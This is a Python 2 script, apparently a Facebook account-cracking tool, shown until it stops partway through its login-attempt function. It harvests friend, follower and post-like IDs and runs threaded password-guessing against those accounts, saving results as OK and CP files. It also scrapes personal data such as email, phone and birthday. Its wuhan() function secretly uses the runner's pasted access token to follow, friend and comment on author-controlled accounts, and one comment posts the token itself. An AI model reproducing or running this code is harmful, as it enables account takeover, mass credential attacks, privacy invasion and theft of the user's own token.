#!/usr/bin/python2
# coding=utf-8
# code by ****
# my facebook ( https://www.facebook.com/ham143mah)

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By ****

import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests belum terinstall!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [×] Modul Bs4 belum terinstall!...\n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'October', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->

ok = []
cp = []
id = []
user = []
num = 0
loop = 0
xi_jimpinx = '266854565354067'
koh = '100060885769913'
url = "https://mbasic.facebook.com"
hoetank = random.choice(['THANKS FOR USING MY TOOL'])
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] remove token %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)

# LO KONTOL
logo='''
'########::'####::::'###::::'########:
 ##.... ##:. ##::::'## ##:::..... ##::
 ##:::: ##:: ##:::'##:. ##:::::: ##:::
 ########::: ##::'##:::. ##:::: ##::::
 ##.. ##:::: ##:: #########::: ##:::::
 ##::. ##::: ##:: ##.... ##:: ##::::::
 ##:::. ##:'####: ##:::: ##: ########:
..:::::..::....::..:::::..::........::
 
\033[0;93mUR D4D >  RIAZKHAN               
\033[0;92mWP NO  >  03188214452
\033[0;94mYT          >  IT'S RIAZ YT
\033[0;91mLover     >  AYESHA '''
                                                                             
lo_ngentod = '266854565354067'
# crack selesai
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] cracks complete...'%(N,K,N)
        print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
        print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
    else:
        print '\n\n [%s!%s] AGAIN TRY BRO YOUR RESULTS NOT FOUND :('%(M,N);exit()

#masuk token
def yayanxd():
    os.system('clear')
    #print (' %s*%s tools ini menggunakan login token facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
    kontol = raw_input('\n %s[%s?%s] Past Token :%s '%(N,M,N,H))
    if kontol in ('open', 'Open', 'OPEN'):
        raw_input(' %s*%s Press Enter '%(O,N))
        os.system('xdg-open https://www.facebook.com/Riaz-hacker-100835532473815/')
        yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
        print '\n\n %s*%s BAO RAMII AA MAI %s%s%s'%(O,N,K,nama,N);time.sleep(2)
        print ' %s*%s WELCOME TO THE RIAZ TOOL ENJOY FREE CLONING...'%(O,N);time.sleep(2)
        print ' %s*%s ｡☆✼★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★✼☆｡'%(O,N);time.sleep(2)
        open('.memek.txt', 'w').write(kontol)
        raw_input(' %s*%s Click Enter '%(O,N));wuhan(kontol)
        os.system('xdg-open https://www.facebook.com/Riaz-hacker-100835532473815/')
        moch_yayan()
    except KeyError:
        print '\n\n %s[%s!%s] TOKEN-EXPIRE (PAST HERE TOKEN) BRO'%(N,M,N);time.sleep(2);yayanxd()

### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
    	kontol = open('.memek.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s]TOKEN EXPIRE'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] TOKEN EXPIRE'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] no connection\n'%(N,M,N))
    os.system('clear')
    print logo
    IP = requests.get('https://api.ipify.org').text
    print '｡☆✼★━━━━━━━━━━━━━━━━━━━★✼☆｡\n';time.sleep(0.03)
    print ' \033[0;92m(✔︎)\033[0;92m ACTIVE USER : %s'%(nama);time.sleep(0.03)
    print ' \033[0;92m(✔︎)\033[0;92m IP DEVICE   : %s'%(IP)
    print '｡☆✼★━━━━━━━━━━━━━━━━━━━★✼☆｡\n';time.sleep(0.03) 
    print ' [%s1%s]. Dump id of friends'%(O,N);time.sleep(0.03)
    print ' [%s2%s]. Dump id of public friend'%(O,N );time.sleep(0.03)
    print ' [%s3%s]. Dump id of total followers'%(O,N);time.sleep(0.03)
    print ' [%s4%s]. Dump id from like post'%(O,N);time.sleep(0.03)
    print ' [%s5%s]. Start crack'%(N,H);time.sleep(0.03)
    print ' [%s6%s]. Check fb account information'%(O,N);time.sleep(0.03)
    print ' [%s7%s]. View crack results'%(O,N);time.sleep(0.03)
    print ' [%s8%s]. Settings user agent'%(O,N);time.sleep(0.03)
    print ' [%s9%s]. Ingfo %sscript%s'%(O,N,O,N);time.sleep(0.03)
    print ' [%s0%s]. logout (%sRemove Token%s)'%(M,N,M,N);time.sleep(0.03)
    pepek = raw_input('\n [*] menu : ')
    if pepek == '':
        print '\n %s[%s×%s] WRONG! BRO'%(N,M,N);time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
    elif pepek in['3','03']:
        followers(kontol)
    elif pepek in['4','04']:
        postingan(kontol)
    elif pepek in['5','05']:
        __crack__().plerr()
    elif pepek in['6','06']:
        cek_ingfo(kontol)
    elif pepek in['7','07']:
        try:
            dirs = os.listdir("results")
            print '\n [ crack results stored in your file ]\n'
            for file in dirs:
                print(" [%s+%s] %s"%(O,N,file))
            file = raw_input("\n [%s?%s] Enter File Name :%s "%(M,N,H))
            if file == "":
                file = raw_input("\n %s[%s?%s] Enter File Name :%s %s"%(N,M,N,H,N))
            total = open("results/%s"%(file)).read().splitlines()
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            hps_nm  = nm_file.replace(".txt", "").replace("RIAZ-OK", "").replace("RIAZ-CP", "")
            jalan(" [%s*%s] Results %scrack%s on %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
            for memek in total:
            	kontol = memek.replace("\n","")
                titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                print("%s%s"%(titid,N));time.sleep(0.03)
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
            raw_input('\n  [ %sRETURN%s ] '%(O,N));moch_yayan()
        except (IOError):
            print("\n %s[%s×%s] opshh you are not getting results :("%(N,M,N))
            raw_input('\n  [ %sRETURN%s ] '%(O,N));moch_yayan()
    elif pepek in['8','08']:
        seting_yntkts()
    elif pepek in['9','09']:
        info_tools()
    elif pepek in['0','00']:
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf .memek.txt')
        jalan('\n %s[%s✓%s]%s successfully deleted token'%(N,H,N,H));exit()
    else:
        print '\n %s[%s×%s] menu [%s%s%s] no, check the menu bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()

# Yang ganti bot nya gw sumpahin mak lo mati ajg!
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100060885769913/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100012267158212/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100009834670141/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100007026360241/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
    except:
    	pass

# dump id dari teman hehe
def teman(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n %s[%s?%s] FILE NAME: '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys  = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] successfully dump id from friend'%(N,H,N))
        print ' [%s•%s] copy the output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] THIS ID NOT PUBLIC PLEASE ENTER DIFFERENT ID.\n'%(N,M,N))
        raw_input(' [ %sRETURN%s ] '%(O,N));moch_yayan()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# dump id dari teman publik hehe
def publik(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] ID Public  : '%(N,O,N))
        ahh = raw_input(' %s[%s?%s] Name File  : '%(N,O,N))
        ihh = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        knt = ('dump/' + ahh + '.json').replace(' ', '_')
        ys  = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] successfully dump id of public friend'%(N,H,N))
        print ' [%s•%s] Copy output file 👉 ( %s%s%s )'%(O,N,M,knt,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] THIS ID NOT PUBLIC PLEASE ENTER THE DIFFERENT ID.\n'%(N,M,N))
        raw_input(' [ %sRETURN%s ] '%(O,N));moch_yayan()

# dump id dari followers hehe
def followers(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id follow  : '%(N,O,N))
        mmk = raw_input(' %s[%s?%s] NAME FILE  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] Limit ID  : '%(N,O,N))
        ah  = ('dump/' + mmk + '.json').replace(' ', '_')
        ys  = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] successfully dump id from total followers'%(N,H,N))
        print ' [%s•%s] Copy output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n %s[%s!%s] Id dump failed, probably id is not public.\n'%(N,M,N))
        raw_input(' [ %sReturn%s ] '%(O,N));moch_yayan()

# dump id dari followers hehe
def followers(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id follow  : '%(N,O,N))
        mmk = raw_input(' %s[%s?%s] NAME FILE  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        ah  = ('dump/' + mmk + '.json').replace(' ', '_')
        ys  = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] successfully dump id from total followers'%(N,H,N))
        print ' [%s•%s] Copy output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n %s[%s!%s] Id dump failed, probably id is not public.\n'%(N,M,N))
        raw_input(' [ %sReturn%s ] '%(O,N));moch_yayan()

# dump id dari postingan hehe
def postingan(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id posting : '%(N,O,N))
        ppk = raw_input(' %s[%s?%s] name file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        ahh = ('dump/' + ppk + '.json').replace(' ', '_')
        ys  = open(ahh, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] successfully dump id from like post'%(N,H,N))
        print ' [%s•%s] Copy output file 👉 ( %s%s%s )'%(O,N,M,ahh,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ahh)
        jalan('\n %s[%s!%s] Id dump failed, probably id is not public.\n'%(N,M,N))
        raw_input(' [ %sReturn%s ] '%(O,N));moch_yayan()

# cek ingfo
def cek_ingfo(kontol):
    try:
        user = raw_input("\n [%s+%s] enter id or username : "%(O,N))
        if user == '':
            print "\n [%s!%s] don't be empty bro"%(M,N);cek_ingfo(kontol)
        url = ("https://lookup-id.com/")
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        else:
            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
        halaman = requests.post(url, data = payload).text.encode("utf-8")
        sop_ = BeautifulSoup(halaman, "html.parser")
        email_ = sop_.find("span", id = "code")
        idt = email_.text
        if user == "me":
            idt = "me"
        x = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt, kontol)).json()
        nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s'%(M,N)
    print '\n  * Facebook account information *';time.sleep(0.03)
    print '\n [*] name complete : %s'%(nmaa);time.sleep(0.03)
    try:
    	ndpn = x['first_name']
    except (KeyError, IOError):
    	ndpn = '%s-%s'%(M,N)
    print ' [*] name front   : %s'%(ndpn);time.sleep(0.03)
    try:
    	nmbl = x['last_name']
    except (KeyError, IOError):
    	nmbl = '%s-%s'%(M,N)
    print ' [*] last name: %s'%(nmbl);time.sleep(0.03)
    try:
    	hwhs = x['username']
    except (KeyError, IOError):
    	hwhs = '%s-%s'%(M,N)
    print ' [*] username fb  : %s'%(hwhs);time.sleep(0.03)
    try:
    	asu = x['id']
    except (KeyError, IOError):
    	asu = '%s-%s'%(M,N)
    print ' [*] id facebook  : %s'%(asu);time.sleep(0.03)
    print '\n  * facebook account data *\n';time.sleep(0.03)
    try:
    	emai = x['email']
    except (KeyError, IOError):
    	emai = '%s-%s'%(M,N)
    print ' [*] gmail facebook : %s'%(emai);time.sleep(0.03)
    try:
    	nmrr = x['mobile_phone']
    except (KeyError, IOError):
    	nmrr = '%s-%s'%(M,N)
    print ' [*] nomor telepon  : %s'%(nmrr);time.sleep(0.03)
    try:
    	ttll = x['birthday']
        month, day, year = ttll.split("/")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
        year = '%s-%s'%(M,N)
    print ' [*] date of birth  : %s %s %s '%(day,month,year);time.sleep(0.03)
    try:
    	jenis = x['gender'].replace("female", "Perempuan").replace("male", "Laki-laki")
    except (KeyError, IOError):
    	jenis = ''
    print ' [*] gender  : %s '%(jenis)
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except:pass
    print ' [*] number of friends  : %s'%str(len(id));time.sleep(0.03)
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    print ' [*] total followers: %s'%(pengikut);time.sleep(0.03)
    try:
    	lins = x['link']
    except (KeyError, IOError):
    	lins = '%s-%s'%(M,N)
    print ' [*] link facebook  : %s'%(lins);time.sleep(0.03)
    try:
    	stas = x['relationship_status']
    except (KeyError, IOError):
    	stas = '%s-%s'%(M,N)
    try:
    	dgn = '''with %s'''%(x['significant_other']['name'])
    except (KeyError, IOError):
    	dgn = '%s-%s'%(M,N)
    except: pass
    print ' [*] relationship status: %s %s'%(stas,dgn);time.sleep(0.03)
    try:
    	bioo = x['about']
    except (KeyError, IOError):
    	bioo = '%s-%s'%(M,N)
    except: pass
    print ' [*] about status : %s'%(bioo);time.sleep(0.03)
    try:
    	dari = x['hometown']['name']
    except (KeyError, IOError):
    	dari = '%s-%s'%(M,N)
    except: pass
    print ' [*] hometown      : %s'%(dari);time.sleep(0.03)
    try:
    	tigl = x['location']['name']
    except (KeyError, IOError):
    	tigl = '%s-%s'%(M,N)
    except: pass
    print ' [*] stay in     : %s'%(tigl);time.sleep(0.03)
    try:
    	tzim = x['timezone']
    except (KeyError, IOError):
    	tzim = '%s-%s'%(M,N)
    except: pass
    print ' [*] time zone     : %s'%(tzim);time.sleep(0.03)
    try:
    	jam  = x['updated_time'][11:19]
    	uptd = x['updated_time'][:10]
        year, month, day = uptd.split("-")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	year = '%s-%s'%(M,N)
        month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
    except:pass
    print ' [*] last updated on %s month %s year %s Time %s'%(day, month, year, jam);time.sleep(0.03)
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
    jalan('\n [%s✓%s] successfully checked facebook account data\n\n'%(O,N));exit()

# cek ingfo sc
def info_tools():
    os.system('clear')
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    print '\n %s[%s>%s] 𝐄𝐃𝐈𝐓𝐎𝐑༆   : RIAZ-KHAM .'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] 𝐆𝐈𝐓𝐇𝐔𝐁༆    :KU BATAO'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] 𝐖𝐡𝐚𝐭𝐒𝐀𝐏༆   : 03188214452'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 : RIAZKHAM  '%(N,H,N);time.sleep(0.07)
    print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    raw_input('\n  [ %sReturn%s ] '%(O,N));moch_yayan()

### ganti user agent
def seting_yntkts():
    print '\n (%s1%s) change user agent'%(O,N)
    print ' (%s2%s) check user agent'%(O,N)
    ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
    if ytbjts == '':
        print '\n %s[%s×%s] Cant be empty Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
    elif ytbjts =='1':
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts =='2':
        check_yntkts()
    else:
        print '\n %s[%s×%s] correct input'%(N,M,N);time.sleep(2);seting_yntkts()

# User Agent baru
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    print '\n %s(%s•%s) notice me: search for User Agent in google chrome.'%(N,O,N)
    print ' (%s×%s) type User Agent or My User Agent....\n'%(M,N)
    anjng = raw_input(' [%s?%s] Enter User Agent :%s '%(O,N,H))
    if anjng == '':
        print '\n %s[%s×%s] Cant be empty Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    try:
        open('YNTKTS.txt', 'w').write(anjng);time.sleep(2)
        jalan('\n %s[%s✓%s] successfully changed the user agent...'%(N,H,N))
        raw_input('\n  %s[ %come back%s ]'%(N,O,N));moch_yayan()
    except:pass

# Cek User Agent
def check_yntkts():
    try:
        user_agent = open('YNTKTS.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
    print '\n %s[%s+%s] Your User Agent : %s%s'%(N,O,N,H,user_agent)
    raw_input('\n  %s[ %sReturn%s ]'%(N,O,N));moch_yayan()

# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] input file : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] no, dump id first bro check numbers 1 to 4'%(N,M,N,M,self.apk,N);time.sleep(3)
            raw_input('\n  %s[ %sreturn%s ]'%(N,O,N));moch_yayan()
        ___yayanganteng___ = raw_input(' [%s?%s] do you want to use manual password? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] use , (koma) for example Password : Khan123, khan12345, etc.each word is at least 6 characters or more'%(N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] enter password : '%(O,N))
                print ' [*] crack with password -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s×%s] dont empty the password bro'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%s×%s] password minimum 6 characters'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%s×%s] dont be empty bro'%(N,M,N);self.__yan__()
                        elif cin == '1':
                            print '\n [%s+%s] RIAZ-OK results are saved to -> results/RIAZ-OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] RIAZ-CP results are saved to -> results/RIAZ-CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] TURN ON OFF(FILGHT)MOD ONLY 5 SEC EVERY 10 MUNTINS\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '2':
                            print '\n [%s+%s] RIAZ-OK results are saved to -> results/RIAZ-OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] RIAZ-CP results are saved to -> results/RIAZ-CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] TURN ON OFF(FILGHT)MOD ONLY 5 SEC EVERY 10 MUNTINS\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '3':
                            print '\n [%s+%s] RIAZ-OK results are saved to -> results/RIAZ-OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s]  RIAZ-CP results are saved to -> results/RIAZ-CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] TURN ON OFF(FILGHT)MOD ONLY 5 SEC EVERY 10 MUNTINS\n'%(N,H)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print '\n %s[%s×%s] Please Slecet The One option'%(N,M,N);self.__yan__()
                    #print '\n [ please Choose one of them]\n'
                    print ' [%s1%s]. method API (fast)'%(O,N)
                    print ' [%s2%s]. method mbasic (RIAZ-OK IDS)'%(O,N)
                    print ' [%s3%s]. method mobile (super slow)'%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ Please Slecet The One Option]\n'
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
            self.__pler__()
        else:
            print '\n %s[%s×%s] y/t stupid!'%(N,M,N);time.sleep(2);moch_yayan()
        return

    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> RIAZ-OK-:%s - RIAZ-CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
